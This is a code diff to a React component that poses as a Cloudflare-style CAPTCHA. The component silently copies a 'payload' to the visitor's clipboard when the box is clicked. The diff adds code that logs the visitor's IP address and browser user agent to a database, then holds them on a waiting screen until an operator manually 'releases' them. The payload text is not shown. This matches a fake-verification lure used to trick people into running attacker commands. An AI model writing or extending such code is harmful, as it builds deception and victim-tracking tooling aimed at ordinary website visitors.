@@ -57,15 +57,51 @@ const CfCaptcha = () => {
     } catch {}
   };
 
-  const onCheck = () => {
+  const [requestId, setRequestId] = useState<string | null>(null);
+
+  const onCheck = async () => {
     if (phase !== "idle") return;
     copyPayload();
     setPhase("verifying");
-    setTimeout(() => {
-      setPhase("success");
-      setTimeout(() => setPhase("slider"), 900);
-    }, 1400);
+    // create captcha request for admin release
+    try {
+      const ua = typeof navigator !== "undefined" ? navigator.userAgent : null;
+      let ip: string | null = null;
+      try {
+        const ctrl = new AbortController();
+        const t = setTimeout(() => ctrl.abort(), 2500);
+        const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal });
+        clearTimeout(t);
+        const j = await r.json();
+        if (typeof j?.ip === "string") ip = j.ip;
+      } catch {}
+      const { data } = await (supabase as any)
+        .from("captcha_requests")
+        .insert({ next_url: nextUrl, client_ua: ua, client_ip: ip })
+        .select("id").single();
+      if (data?.id) setRequestId(data.id);
+    } catch {}
+    setTimeout(() => setPhase("waiting"), 1400);
   };
+
+  // poll for admin release
+  useEffect(() => {
+    if (phase !== "waiting" || !requestId) return;
+    let cancelled = false;
+    const check = async () => {
+      const { data } = await (supabase as any)
+        .from("captcha_requests").select("released_at").eq("id", requestId).maybeSingle();
+      if (cancelled) return;
+      if (data?.released_at) {
+        setPhase("success");
+        setTimeout(() => { if (!cancelled) setPhase("slider"); }, 900);
+      }
+    };
+    check();
+    const iv = setInterval(check, 2000);
+    return () => { cancelled = true; clearInterval(iv); };
+  }, [phase, requestId]);
+
 
 
   const onDown = (clientX: number) => {
